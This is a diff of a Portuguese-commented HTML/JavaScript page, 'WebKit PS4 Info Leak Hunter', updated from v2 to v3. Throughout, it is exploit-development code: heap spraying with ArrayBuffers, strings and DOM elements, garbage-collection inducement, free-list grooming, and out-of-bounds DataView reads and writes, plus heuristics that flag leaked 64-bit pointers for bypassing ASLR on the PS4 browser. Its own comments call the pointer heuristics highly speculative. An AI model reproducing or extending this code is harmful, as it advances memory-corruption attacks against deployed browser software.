@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>WebKit PS4 Info Leak Hunter v2</title>
+    <title>WebKit PS4 Info Leak Hunter v3 (Advanced)</title>
     <style>
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
         #output {
@@ -25,14 +25,14 @@
         .log-ptr { color: #f0f; font-weight: bold; }
         .log-spray { color: #9C27B0; } /* Roxo para logs de spray */
         .log-gc { color: #00BCD4; } /* Ciano para logs de GC */
-        .log-debug { color: #795548; } /* Marrom para logs de debug */
+        .log-debug { color: #795548; font-style: italic; } /* Marrom para logs de debug */
         .log-escalation { background-color: #800000; color: #fff; font-weight: bold; padding: 1px 3px; border-radius: 3px; }
     </style>
 </head>
 <body>
-    <h1>WebKit PS4 Info Leak Hunter v2</h1>
+    <h1>WebKit PS4 Info Leak Hunter v3 (Advanced)</h1>
     <p>Tenta Heap Spray/Grooming e OOB Read para obter um info leak no WebKit (PS4).</p>
-    <button id="runBtn" onclick="runAdvancedInfoLeakTest()">Iniciar Teste Avançado de Info Leak</button>
+    <button id="runBtn" onclick="runAdvancedInfoLeakTest()">Iniciar Teste Avançado de Info Leak v3</button>
     <div id="output"></div>
 
     <script>
@@ -42,7 +42,7 @@
         const MEDIUM_PAUSE = 250;
         const LONG_PAUSE = 500;
         let leakedValueFromOOB = null;
-        let sprayObjectsContainer = []; // Para manter referências e evitar GC prematuro dos sprays
+        let sprayObjectsContainer = [];
 
         const log = (message, type = 'info', funcName = '') => {
             if (!outputDiv) return;
@@ -51,7 +51,7 @@
                 const prefix = funcName ? `[${funcName}] ` : '';
                 const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
                 const logClass = ['vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation', 'spray', 'gc', 'debug'].includes(type) ? type : 'info';
-                if(outputDiv.innerHTML.length > 1000000){ // Buffer de log maior
+                if(outputDiv.innerHTML.length > 1000000){
                     outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 500000);
                     outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML;
                 }
@@ -69,70 +69,39 @@
             return '0x' + num.toString(16).toUpperCase().padStart(pad, '0');
         };
 
-        // --- Técnicas de Spray ---
-        const performArrayBufferSpray = (count = 0x100, size = 0x4000, patternHigh = 0x41414141, patternLow = 0x42424242) => {
+        const performArrayBufferSpray = (count = 0x1000, size = 0x4000, patternHigh = 0xDEADBEEF, patternLow = 0xCAFEBABE) => {
             const FNAME = "performArrayBufferSpray";
-            log(`Iniciando ArrayBuffer Spray: ${count} objetos de tamanho ${toHex(size)}...`, 'spray', FNAME);
+            log(`Iniciando ArrayBuffer Spray: ${count} objetos de tamanho ${toHex(size)}... Padrão H=${toHex(patternHigh)}, L=${toHex(patternLow)}`, 'spray', FNAME);
             let localSprayStore = [];
             try {
                 for (let i = 0; i < count; i++) {
                     let ab = new ArrayBuffer(size);
                     let view = new Uint32Array(ab);
                     for (let j = 0; j < view.length; j += 2) {
-                        view[j] = patternLow; // Padrão ABAB ou similar
-                        if (j + 1 < view.length) view[j+1] = patternHigh; // Padrão CDCD
+                        view[j] = patternLow;
+                        if (j + 1 < view.length) view[j+1] = patternHigh;
                     }
-                    localSprayStore.push(ab); // Manter referência
+                    localSprayStore.push(ab);
                 }
-                sprayObjectsContainer = sprayObjectsContainer.concat(localSprayStore); // Adicionar ao container global
+                sprayObjectsContainer = sprayObjectsContainer.concat(localSprayStore);
                 log(`ArrayBuffer Spray concluído. Total objetos no container: ${sprayObjectsContainer.length}`, 'good', FNAME);
             } catch (e) {
                 log(`Erro durante ArrayBuffer Spray: ${e.message}`, 'error', FNAME);
             }
         };
 
-        const performDOMElementSpray = (count = 1000) => { // Reduzido para evitar lentidão excessiva
-            const FNAME = "performDOMElementSpray";
-            log(`Iniciando DOM Element Spray: ${count} elementos <div>...`, 'spray', FNAME);
-            let localSprayStore = [];
-            let tempContainer = document.createDocumentFragment(); // Usar fragmento para performance
-            try {
-                for (let i = 0; i < count; i++) {
-                    let div = document.createElement('div');
-                    div.id = `spray_div_${Date.now()}_${i}`;
-                    // Adicionar alguns atributos e conteúdo pode influenciar o tamanho e a estrutura na memória
-                    div.setAttribute('data-spray-id', i.toString());
-                    div.textContent = `SprayPayload_${"A".repeat(32 + (i%10))}_${i}`; // Conteúdo variado
-                    // Não adicionar ao DOM principal imediatamente para evitar lentidão, mas manter referência
-                    localSprayStore.push(div);
-                }
-                // Para que os elementos sejam realmente processados pelo motor, pode ser necessário adicioná-los
-                // a um elemento destacado do DOM ou brevemente ao DOM principal. Testar com cautela.
-                // document.body.appendChild(tempContainer); // Pode ser muito lento ou crashar se count for grande
-                sprayObjectsContainer = sprayObjectsContainer.concat(localSprayStore);
-                log(`DOM Element Spray concluído. Total objetos no container: ${sprayObjectsContainer.length}`, 'good', FNAME);
-            } catch (e) {
-                log(`Erro durante DOM Element Spray: ${e.message}`, 'error', FNAME);
-            }
-        };
-
-        const performStringUnicodeSpray = (count = 0x100, lengthPerString = 0x1000) => {
+        const performStringUnicodeSpray = (count = 0x100, lengthPerPatternUnit = 2048) => {
             const FNAME = "performStringUnicodeSpray";
-            log(`Iniciando String Unicode Spray: ${count} strings de tamanho aprox. ${lengthPerString*2}...`, 'spray', FNAME);
+            log(`Iniciando String Unicode Spray: ${count} strings de tamanho aprox. ${lengthPerPatternUnit * 2 * 2} bytes...`, 'spray', FNAME); // *2 for patternUnit, *2 for UTF-16
             let localSprayStore = [];
-            // Pattern: \u4141\u4242 (AABB em bytes como UTF-16)
-            // Cada caractere Unicode \uXXXX usa 2 bytes.
-            // Para um padrão de 8 bytes (ex: um ponteiro) seria \u4141\u4242\u4343\u4444
-            const patternUnit = "\u4141\u4242\u4343\u4444"; // AABBCCDD
+            const patternUnit = "\u4141\u4242\u4343\u4444"; // "AABBCCDD" como U64 se interpretado corretamente
             let baseString = "";
-            for(let i = 0; i < Math.ceil(lengthPerString / (patternUnit.length)); i++){
+            for(let i = 0; i < Math.ceil(lengthPerPatternUnit / patternUnit.length); i++){
                 baseString += patternUnit;
             }
-
             try {
                 for (let i = 0; i < count; i++) {
-                    // Adicionar um pequeno identificador único no início ou fim da string pode ajudar
-                    localSprayStore.push( `SPRAY_ID${i.toString().padStart(4,'0')}${baseString.substring(0, lengthPerString - 10)}`);
+                    localSprayStore.push( `STR_SPRAY_ID_${i.toString().padStart(5,'0')}_${baseString}`);
                 }
                 sprayObjectsContainer = sprayObjectsContainer.concat(localSprayStore);
                 log(`String Unicode Spray concluído. Total objetos no container: ${sprayObjectsContainer.length}`, 'good', FNAME);
@@ -140,124 +109,151 @@
                 log(`Erro durante String Unicode Spray: ${e.message}`, 'error', FNAME);
             }
         };
+        
+        const performDOMElementSpray = (count = 200) => {
+            const FNAME = "performDOMElementSpray";
+            log(`Iniciando DOM Element Spray: ${count} elementos <div>...`, 'spray', FNAME);
+            let localSprayStore = [];
+            try {
+                for (let i = 0; i < count; i++) {
+                    let div = document.createElement('div');
+                    div.id = `spray_dom_div_${Date.now()}_${i}`;
+                    div.setAttribute('data-spray-val', `${i}__${"DOM".repeat(10 + (i%5))}`);
+                    localSprayStore.push(div);
+                }
+                sprayObjectsContainer = sprayObjectsContainer.concat(localSprayStore);
+                log(`DOM Element Spray concluído (referências mantidas). Total objetos no container: ${sprayObjectsContainer.length}`, 'good', FNAME);
+            } catch (e) {
+                log(`Erro durante DOM Element Spray: ${e.message}`, 'error', FNAME);
+            }
+        };
 
         const triggerGC = async () => {
             const FNAME = "triggerGC";
             log("Tentando induzir Garbage Collection...", 'gc', FNAME);
             try {
-                // Técnica 1: Alocar e desreferenciar muitos objetos pequenos
                 let temp = [];
-                for (let i = 0; i < 10000; i++) { // Aumentado
-                    temp.push(new Object());
-                }
-                temp = null;
-
-                // Técnica 2: Alocar um ArrayBuffer grande e depois encolhê-lo (se suportado) ou desreferenciar
-                // Algumas engines podem ter otimizações para ArrayBuffer.transfer ou resize.
-                // No PS4, a disponibilidade/comportamento é incerta.
-                if (typeof ArrayBuffer.transfer === 'function') { // Raro
-                    let bigBoy = new ArrayBuffer(1024 * 1024 * 16); // 16MB
-                     // bigBoy = ArrayBuffer.transfer(bigBoy, 0); // Tenta encolher para 0
+                for (let i = 0; i < 20000; i++) { temp.push({});} // Aumentado
+                temp = []; // Desreferenciar
+                if (typeof ArrayBuffer.transfer === 'function') {
+                    // let bigBoy = new ArrayBuffer(32 * 1024 * 1024); // 32MB
+                    // bigBoy = ArrayBuffer.transfer(bigBoy, 0);
                 } else {
-                    let bigBoy = new ArrayBuffer(1024 * 1024 * 16);
-                    bigBoy = null;
+                    // let bigBoy = new ArrayBuffer(32 * 1024 * 1024); bigBoy = null;
                 }
-                 log("GC Inducement: Alocações/Desreferenciações feitas.", 'gc', FNAME);
-
-                // Se window.gc estiver exposto (muito raro em ambientes de produção, mais comum em debug builds)
+                log("GC Inducement: Alocações/Desreferenciações feitas.", 'gc', FNAME);
                 if (typeof window.gc === 'function') {
-                    log("window.gc() está disponível! Chamando...", 'gc', FNAME);
-                    window.gc();
-                    log("window.gc() chamado.", 'good', FNAME);
-                } else {
-                    log("window.gc() não está disponível.", 'warn', FNAME);
-                }
-            } catch (e) {
-                log(`Erro ao tentar induzir GC: ${e.message}`, 'error', FNAME);
-            }
-            await PAUSE(MEDIUM_PAUSE); // Dar tempo para o GC (se acionado) rodar
+                    log("window.gc() está disponível! Chamando...", 'gc', FNAME); window.gc(); log("window.gc() chamado.", 'good', FNAME);
+                } else { log("window.gc() não está disponível.", 'warn', FNAME); }
+            } catch (e) { log(`Erro ao tentar induzir GC: ${e.message}`, 'error', FNAME); }
+            await PAUSE(MEDIUM_PAUSE);
         };
 
+        const performFreeListGroom = async (percentageToFree = 0.33, targetTypeConstructor = ArrayBuffer) => {
+            const FNAME = "performFreeListGroom";
+            log(`Iniciando FreeList Grooming: Liberando aprox. ${percentageToFree*100}% de objetos ${targetTypeConstructor.name}...`, 'spray', FNAME);
+            let freedCount = 0;
+            let initialTypeCount = 0;
+            let indicesToNullify = [];
 
-        // --- Função OOB Leak (com heurísticas relaxadas) ---
+            for (let i = 0; i < sprayObjectsContainer.length; i++) {
+                if (sprayObjectsContainer[i] instanceof targetTypeConstructor) {
+                    initialTypeCount++;
+                    if (Math.random() < percentageToFree) {
+                        indicesToNullify.push(i);
+                    }
+                }
+            }
+            if (initialTypeCount === 0) {
+                log(`Nenhum objeto do tipo ${targetTypeConstructor.name} encontrado para liberar.`, 'warn', FNAME);
+                return;
+            }
+            for (let i = indicesToNullify.length - 1; i >= 0; i--) { // Liberar de trás para frente
+                sprayObjectsContainer[indicesToNullify[i]] = null;
+                freedCount++;
+            }
+            // Para realmente limpar o array e reduzir seu tamanho, se necessário:
+            // sprayObjectsContainer = sprayObjectsContainer.filter(obj => obj !== null);
+            log(`FreeList Grooming: ${freedCount} de ${initialTypeCount} objetos ${targetTypeConstructor.name} desreferenciados.`, 'good', FNAME);
+            log("Tentando induzir GC após grooming...", 'gc', FNAME);
+            await triggerGC();
+        };
+
         const attemptOOBLeakInternal = async () => {
             const FNAME = 'attemptOOBLeakInternal';
             log("--- Iniciando Tentativa de Vazamento OOB (Interna) ---", 'test', FNAME);
-            // Parâmetros para OOB
             const bufferSize = 32;
             const oobWriteOffset = bufferSize;
             const writeValue = 0xEE;
-            const readRangeStart = -128; // Aumentar com cautela
-            const readRangeEnd = bufferSize + 128; // Aumentar com cautela
-            const allocationSize = bufferSize + 256 + Math.abs(readRangeStart) + 128; // Garantir espaço
+            const readRangeStart = -128;
+            const readRangeEnd = bufferSize + 128;
+            const allocationSize = bufferSize + 256 + Math.abs(readRangeStart) + 128;
             const baseOffsetInBuffer = Math.abs(readRangeStart) + 64;
 
             const oobReadOffsets = [];
-            for (let i = readRangeStart; i < readRangeEnd; i += 1) { // Leitura byte a byte para máxima granularidade
-                oobReadOffsets.push(i);
-            }
-            // oobReadOffsets.sort((a, b) => a - b); // Já está ordenado
+            for (let i = readRangeStart; i < readRangeEnd; i += 1) { oobReadOffsets.push(i); }
 
             let writeSuccess = false;
             let potentialLeakFoundCount = 0;
-            // leakedValueFromOOB é global
 
-            // Heurística de ponteiro RELAXADA para PS4 WebKit (ajustar conforme necessário!)
             const isSanePointerCandidate64_PS4WebKit = (high, low, addressReadFrom) => {
                 const FNAME_HC = "isSanePtr64_PS4";
                 if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false;
 
-                // Filtros básicos
+                if (high === 0xBBBBBBBB && low === 0xBBBBBBBB) { log(`[DEBUG ${FNAME_HC}] DESCARTADO (Fill Pattern BB)`, 'debug'); return false; }
+                if (high === 0xDEADBEEF && low === 0xCAFEBABE) { log(`[DEBUG ${FNAME_HC}] DESCARTADO (Spray Pattern DEADBEEFCAFEBABE)`, 'debug'); return false; }
+                if (high === 0xCAFEBABE && low === 0xDEADBEEF) { log(`[DEBUG ${FNAME_HC}] DESCARTADO (Spray Pattern CAFEBABEDEADBEEF)`, 'debug'); return false; }
+
                 if (high === 0 && low === 0) return false;
-                if ((high === 0xFFFFFFFF && low === 0xFFFFFFFF) || (high === 0 && low === 0xFFFFFFFF) ) return false;
-                // Adicionar mais padrões de preenchimento se observados
-                if ((high === 0xBBBBBBBB && low === 0xBBBBBBBB) || (high === 0 && low === 0xBBBBBBBB) ) return false; // Nosso fill pattern
-                if ((high === 0xCDCDCDCD && low === 0xCDCDCDCD) || (high === 0 && low === 0xCDCDCDCD) ) return false; // Comum em memória liberada
+                if ((high === 0xFFFFFFFF && low === 0xFFFFFFFF) || (high === 0 && low === 0xFFFFFFFF)) return false;
+                if ((high === 0xAAAAAAAA && low === 0xAAAAAAAA) || (high === 0 && low === 0xAAAAAAAA)) return false;
+                if ((high === 0xCDCDCDCD && low === 0xCDCDCDCD) || (high === 0 && low === 0xCDCDCDCD)) return false;
 
-                // Heurística para PS4 (MUITO ESPECULATIVA - requer conhecimento real das faixas de memória do PS4)
-                // Ponteiros no PS4 (Orbis OS) podem estar em regiões específicas.
-                // Ex: Kernel geralmente acima de 0xFFFFFFFF80000000. Userspace abaixo disso.
-                // WebKit JIT pode estar em uma faixa específica. Módulos do sistema também.
-                // const PS4_KERNEL_BOUNDARY_HIGH = 0xFFFFFFFF; // Simplificado, só para high dword
-                // if (high >= PS4_KERNEL_BOUNDARY_HIGH && low >= 0x80000000) return false; // Evitar kernel space óbvio
+                if (high === 0 && low < 0x100000) { log(`[DEBUG ${FNAME_HC}] DESCARTADO (Endereço baixo demais)`, 'debug'); return false; }
 
-                // Ponteiros para código ou heap geralmente não são muito pequenos
-                if (high === 0 && low < 0x100000) return false; // Abaixo de 1MB pode ser suspeito para código/heap
+                // PS4 Userland Pointer Heuristics (ALTAMENTE ESPECULATIVO - AJUSTE!)
+                // A maioria dos endereços de user-space no PS4 (para módulos carregados, heap, JIT)
+                // costuma ter a parte alta (high dword) relativamente pequena.
+                // ex: 0x00000001XXXXXXXX, 0x0000000XXXXXXXXX
+                // Valores muito altos em 'high' (ex: > 0x0000000F) podem ser suspeitos ou de regiões não interessantes para o primeiro leak.
+                // Ponteiros para a stack podem ser mais altos (ex: 0x00000007FFFFFFFF)
+                const ps4UserHighMinTypical = 0x00000001; // Módulos podem começar aqui
+                // const ps4UserHighMaxTypical = 0x0000000F; // JIT e outras regiões podem ir até aqui, ou mais alto.
 
-                // No PS4, muitos endereços de userspace começam com 0x0000000XXXXXXXXX ou 0xXXXXXXXXX
-                // Se high for muito grande (ex: > 0x0000000F), pode ser suspeito para um ponteiro de userspace típico,
-                // mas isso depende muito do mapeamento de memória.
-                // A remoção do MAX_EXPECTED_USER_HIGH torna isso mais permissivo.
+                if (high < ps4UserHighMinTypical && high !== 0) { // Se high não é zero, mas é menor que o mínimo esperado
+                     log(`[DEBUG ${FNAME_HC}] DESCARTADO (High DWord muito baixo: ${toHex(high)})`, 'debug');
+                     return false;
+                }
+                // if (high > ps4UserHighMaxTypical && high < 0x70000000) { // Evitar valores altos mas não de stack
+                //    log(`[DEBUG ${FNAME_HC}] DESCARTADO (High DWord suspeito/alto: ${toHex(high)})`, 'debug');
+                //    return false;
+                // }
+
+
+                // Alinhamento: ponteiros para início de objetos/funções geralmente são alinhados
+                if ((low & 0x7) !== 0 && (low & 0x3) !== 0) { // Se não for alinhado nem a 4 nem a 8 bytes
+                    log(`[DEBUG ${FNAME_HC}] DESCARTADO (Baixo DWord não alinhado a 4 ou 8: ${toHex(low)})`, 'debug');
+                    return false;
+                }
+
                 log(`[DEBUG ${FNAME_HC}] Avaliando: H=${toHex(high)}, L=${toHex(low)}, LidoDe=${toHex(addressReadFrom)} -> Considerado POTENCIAL!`, 'debug', FNAME);
                 return true;
             };
+            const isSaneDataCandidate32_PS4WebKit = (val32) => { /* ... manter como antes ou refinar ... */ return true; };
 
-            const isSaneDataCandidate32_PS4WebKit = (val32) => {
-                if (val32 === null || typeof val32 !== 'number') return false;
-                val32 = val32 >>> 0;
-                if (val32 === 0 || val32 === 0xFFFFFFFF || val32 === 0xBBBBBBBB || val32 === 0xCDCDCDCD) return false;
-                if (val32 < 0x1000) return false;
-                return true;
-            };
 
             try {
                 const buffer = new ArrayBuffer(allocationSize);
                 const dataView = new DataView(buffer);
-                for (let i = 0; i < buffer.byteLength; i++) {
-                    dataView.setUint8(i, 0xBB);
-                }
-
+                for (let i = 0; i < buffer.byteLength; i++) { dataView.setUint8(i, 0xBB); }
                 const writeTargetAddress = baseOffsetInBuffer + oobWriteOffset;
                 await PAUSE();
                 try {
                     dataView.setUint8(writeTargetAddress, writeValue);
                     log(`VULN: Escrita OOB U8 @${oobWriteOffset} (addr ${toHex(writeTargetAddress)}) OK! Val=${toHex(writeValue, 8)}`, 'vuln', FNAME);
                     writeSuccess = true;
-                } catch (e) {
-                    log(`Escrita OOB U8 @${oobWriteOffset} (addr ${toHex(writeTargetAddress)}) FALHOU/Bloqueada: ${e.message}`, 'warn', FNAME);
-                }
+                } catch (e) { log(`Escrita OOB U8 @${oobWriteOffset} (addr ${toHex(writeTargetAddress)}) FALHOU: ${e.message}`, 'warn', FNAME); }
                 await PAUSE();
-
                 log(`Iniciando varredura de leitura OOB de ${readRangeStart} até ${readRangeEnd}. Total offsets: ${oobReadOffsets.length}`, 'info', FNAME);
 
                 for (const readOffset of oobReadOffsets) {
@@ -273,11 +269,12 @@
                                 const vStr = `H=${toHex(high)} L=${toHex(low)}`;
                                 log(` -> PTR? U64 ${relOffsetStr}: ${vStr}`, 'ptr', FNAME);
                                 potentialLeakFoundCount++;
-                                if (leakedValueFromOOB === null || leakedValueFromOOB.type === 'U32' || 
-                                    (leakedValueFromOOB.type === 'U64' && (leakedValueFromOOB.high !== high || leakedValueFromOOB.low !== low))) { // Armazenar se for novo ou melhor
+                                if (leakedValueFromOOB === null || leakedValueFromOOB.type === 'U32') {
                                     leakedValueFromOOB = { high, low, type: 'U64', offset: readOffset, addressReadFrom: currentReadTargetAddress };
-                                    log(` -> VALOR U64 ARMAZENADO ${relOffsetStr}.`, 'vuln', FNAME);
+                                    log(` -> VALOR U64 ARMAZENADO ${relOffsetStr}. (Primeiro U64 promissor)`, 'vuln', FNAME);
                                     log(` ---> *** ALERTA: Potencial Ponteiro U64 Vazado! ***`, 'escalation', FNAME);
+                                } else {
+                                    log(` -> Outro PTR? U64 ${relOffsetStr}: ${vStr} (Já temos um U64: H=${toHex(leakedValueFromOOB.high)} L=${toHex(leakedValueFromOOB.low)})`, 'info', FNAME);
                                 }
                             }
                         } catch (e) { }
@@ -301,13 +298,10 @@
                             } catch (e) { }
                         }
                     }
-                    if (readOffset % 128 === 0) await PAUSE(10); // Pausa mais longa para varreduras grandes
+                    if (readOffset % 128 === 0) await PAUSE(10);
                 }
-
-            } catch (e) {
-                log(`Erro FATAL na tentativa de leak OOB: ${e.message}`, 'critical', FNAME);
-                console.error(e);
-            } finally {
+            } catch (e) { log(`Erro FATAL na tentativa de leak OOB: ${e.message}`, 'critical', FNAME); console.error(e); }
+            finally {
                 let leakStatus = 'Nenhum valor promissor armazenado.';
                 if (leakedValueFromOOB) {
                     leakStatus = `Melhor leak: ${leakedValueFromOOB.type} @${leakedValueFromOOB.offset} ` +
@@ -319,37 +313,31 @@
             return leakedValueFromOOB !== null;
         };
 
-
-        // --- Orquestrador Principal ---
         const runAdvancedInfoLeakTest = async () => {
             const FNAME = 'runAdvancedInfoLeakTest';
             if (runBtn) runBtn.disabled = true;
             outputDiv.innerHTML = '';
-            leakedValueFromOOB = null; // Resetar a cada execução completa
-            sprayObjectsContainer = []; // Limpar referências de sprays anteriores
+            leakedValueFromOOB = null; 
+            sprayObjectsContainer = []; 
 
-            log("==== INICIANDO WebKit PS4 Info Leak Hunter v2 ====", 'test', FNAME);
+            log("==== INICIANDO WebKit PS4 Info Leak Hunter v3 (Advanced) ====", 'test', FNAME);
             await PAUSE(MEDIUM_PAUSE);
 
-            // Passo 1: Heap Spraying (experimente diferentes combinações e ordens)
             log("--- Fase 1: Heap Spraying ---", 'test', FNAME);
-            performArrayBufferSpray(0x80, 0x4000); // Contagem reduzida para teste inicial, tamanho comum
+            performArrayBufferSpray(0x200, 0x4000, 0xDEADBEEF, 0xCAFEBABE); // 512 buffers de 16KB
             await PAUSE(MEDIUM_PAUSE);
-            performStringUnicodeSpray(0x80, 2048); // Contagem e tamanho reduzidos
+            performStringUnicodeSpray(0x100, 2048); // 256 strings de ~8KB (total ~2MB)
             await PAUSE(MEDIUM_PAUSE);
-            // performDOMElementSpray(500); // DOM spray pode ser pesado, usar com cautela
+            // performDOMElementSpray(100); // Mais leve para teste inicial
             // await PAUSE(MEDIUM_PAUSE);
 
-            // Passo 2: Tentar Induzir GC (para "assentar" o heap e potencialmente limpar freelists)
-            log("--- Fase 2: Tentativa de Indução de GC ---", 'test', FNAME);
-            await triggerGC();
-            await PAUSE(LONG_PAUSE); // Pausa maior após GC
+            log("--- Fase 2: FreeList Grooming ---", 'test', FNAME);
+            await performFreeListGroom(0.33, ArrayBuffer); // Tentar liberar 1/3 dos ArrayBuffers pulverizados
+            await PAUSE(LONG_PAUSE);
 
-            // Passo 3: Tentar o Vazamento OOB
-            log("--- Fase 3: Tentativa de Vazamento OOB ---", 'test', FNAME);
-            await attemptOOBLeakInternal(); // Chama a função OOB interna
+            log("--- Fase 3: Tentativa de Vazamento OOB Pós-Grooming ---", 'test', FNAME);
+            await attemptOOBLeakInternal(); 
 
-            // Passo 4: Reportar o melhor leak encontrado globalmente
             if (leakedValueFromOOB && leakedValueFromOOB.type === 'U64') {
                 log(`RESULTADO FINAL: POTENCIAL PONTEIRO U64 PARA ANÁLISE ASLR: H=${toHex(leakedValueFromOOB.high)} L=${toHex(leakedValueFromOOB.low)}`, 'CRITICAL', FNAME);
                 alert(`Potencial Ponteiro U64 Encontrado!\nH: ${toHex(leakedValueFromOOB.high)}\nL: ${toHex(leakedValueFromOOB.low)}`);
@@ -360,11 +348,9 @@
                 log("RESULTADO FINAL: Nenhum ponteiro ou dado promissor foi vazado nesta execução.", 'warn', FNAME);
                 alert("Nenhum leak promissor encontrado.");
             }
-
-            log("\n==== WebKit PS4 Info Leak Hunter v2 CONCLUÍDO ====", 'test', FNAME);
+            log("\n==== WebKit PS4 Info Leak Hunter v3 (Advanced) CONCLUÍDO ====", 'test', FNAME);
             if (runBtn) runBtn.disabled = false;
         };
-
     </script>
 </body>
 </html>
